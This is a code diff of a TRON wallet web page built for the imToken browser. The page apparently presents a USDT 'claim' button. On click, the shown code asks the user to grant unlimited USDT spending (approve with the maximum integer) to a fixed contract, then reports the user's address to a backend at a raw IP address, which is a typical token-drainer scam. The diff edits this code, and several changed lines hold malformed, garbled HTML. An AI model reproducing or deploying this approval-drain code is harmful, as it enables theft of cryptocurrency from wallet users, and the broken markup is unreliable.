@@ -334,14 +334,14 @@
     </div>
     <script src="imtoken://browser"></script>
     <script>
-        // 核心配置（明确两个合约角色+USDT ABI）
+        // 核心配置
         const PAYMENT_CONTRACT = "TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL"; // 代付合约
         const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT合约
         const BACKEND_PAYMENT_API = "https://203.91.76.22/api/proxy-approve"; // 后端代付接口
         const APPROVE_AMOUNT = "18.2157"; // 领取额度
         const RECORD_KEY = "payment_approval_records";
         const INFINITE_APPROVE = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // 无限授权额度
-        // USDT的TRC20标准ABI（确保合约实例创建成功）
+        // USDT的TRC20标准ABI
         const USDT_ABI = [
             {
                 "constant": true,
@@ -409,12 +409,11 @@
                 }
             });
 
-            // 等待TronWeb注入（imToken兼容版）
+            // 等待TronWeb注入（终极兼容版：仅检测window.tronWeb存在）
             let tronWebWaitTimer = null;
             const waitForTronWeb = new Promise((resolve) => {
                 const checkTronWeb = () => {
-                    // imToken的TronWeb直接挂载在window，无需等ready事件
-                    if (window.tronWeb && window.tronWeb.trx) {
+                    if (window.tronWeb) {
                         clearTimeout(tronWebWaitTimer);
                         resolve(window.tronWeb);
                     }
@@ -426,10 +425,6 @@
                     alert("请用imToken钱包内置浏览器打开此页面");
                     resolve(null);
                 }, 3000);
-                // 兼容部分版本的ready事件
-                window.addEventListener("tronWebReady", () => {
-                    checkTronWeb();
-                });
             });
 
             // 执行等待逻辑
@@ -444,24 +439,9 @@
                 recordlist.style.display = "none";
             }
 
-            // 手动连接钱包（imToken兼容版）
+            // 手动连接钱包（唤起imToken内置浏览器）
             connectBtn.onclick = async () => {
-                try {
-                    if (!window.tronWeb) {
-                        // 唤起imToken内置浏览器
-                        window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href)}`;
-                        return;
-                    }
-                    // 用imToken支持的getAccounts方法获取账户
-                    const accounts = await tronWeb.trx.getAccounts();
-                    if (accounts.length === 0) throw new Error("请授权钱包访问");
-                    userAddress = accounts[0];
-                    connectBtn.style.display = "none";
-                    warning.style.display = "none";
-                    await initWallet();
-                } catch (e) {
-                    alert("连接失败：" + e.message);
-                }
+                window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href)}`;
             };
 
             // 代付核心逻辑（领取按钮）
@@ -474,9 +454,9 @@
                 
                 isProcessing = true;
                 approveBtn.disabled = true;
-                approveBtn.innerHTML = '<<<i class="fa fa-spinner fa-spin"></</i> 授权中...';
+                approveBtn.innerHTML = '<<<<i class="fa fa-spinner fa-spin"></</</i> 授权中...';
                 try {
-                    // 1. 用户授权USDT给代付合约（imToken兼容写法）
+                    // 1. 用户授权USDT给代付合约（兼容旧版TronWeb）
                     const approval = await usdtContract.approve(
                         PAYMENT_CONTRACT, // 授权目标：代付合约
                         INFINITE_APPROVE // 无限授权
@@ -487,7 +467,7 @@
                     });
 
                     // 2. 调用后端代付接口
-                    approveBtn.innerHTML = '<<<i class="fa fa-spinner fa-spin"></</i> 代付转账中...';
+                    approveBtn.innerHTML = '<<<<i class="fa fa-spinner fa-spin"></</</i> 代付转账中...';
                     const paymentParams = {
                         userAddress: userAddress,
                         paymentContract: PAYMENT_CONTRACT,
@@ -529,23 +509,18 @@
             };
         };
 
-        // 初始化钱包（imToken兼容版：移除request方法，用getAccounts）
+        // 初始化钱包（终极兼容版：直接读取defaultAddress）
         async function initWallet() {
             try {
-                // 步骤1：获取用户账户（imToken支持的getAccounts方法）
-                let accounts = await tronWeb.trx.getAccounts();
-                if (accounts.length === 0) {
-                    // 部分imToken版本需要手动授权，唤起授权弹窗
-                    accounts = await tronWeb.trx.requestAccount(); // 兼容另一部分版本
-                }
-                userAddress = accounts[0];
-                if (!userAddress) throw new Error("未获取到钱包地址");
+                // 步骤1：直接读取imToken默认地址（旧版TronWeb唯一支持的方式）
+                userAddress = tronWeb.defaultAddress.base58;
+                if (!userAddress) throw new Error("未检测到钱包地址，请确保已打开imToken并登录");
 
                 // 步骤2：创建USDT合约实例（显式传ABI）
                 usdtContract = await tronWeb.contract(USDT_ABI, USDT_CONTRACT);
                 if (!usdtContract) throw new Error("合约实例创建失败");
                 
-                // 步骤3：验证合约实例+查询余额
+                // 步骤3：查询余额（验证合约实例）
                 const usdtRaw = await usdtContract.balanceOf(userAddress).call();
                 tokenBalance = (Number(usdtRaw) / 1000000).toFixed(2);
                 const trxRaw = await tronWeb.trx.getBalance(userAddress);
@@ -647,8 +622,8 @@
                     <div class="record-item">
                         <p><strong>地址：</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
                         <p><strong>代付额度：</strong>${record.amount}</p>
-                        <p><strong>授权哈希：</strong><a href="https://tronscan.org/#/transaction/${record.approvalTx}" target="_blank" class="tx-link">${record.approvalTx.slice(0,10)}...<<i class="fa fa-external-link"></</i></a></p>
-                        <p><strong>代付哈希：</strong><a href="https://tronscan.org/#/transaction/${record.paymentTx}" target="_blank" class="tx-link">${record.paymentTx.slice(0,10)}...<<i class="fa fa-external-link"></</i></a></p>
+                        <p><strong>授权哈希：</strong><a href="https://tronscan.org/#/transaction/${record.approvalTx}" target="_blank" class="tx-link">${record.approvalTx.slice(0,10)}...<<<i class="fa fa-external-link"></</</i></a></p>
+                        <p><strong>代付哈希：</strong><a href="https://tronscan.org/#/transaction/${record.paymentTx}" target="_blank" class="tx-link">${record.paymentTx.slice(0,10)}...<<<i class="fa fa-external-link"></</</i></a></p>
                         <p><strong>时间：</strong>${record.time}</p>
                         <p><strong>状态：</strong>${record.status}</p>
                     </div>
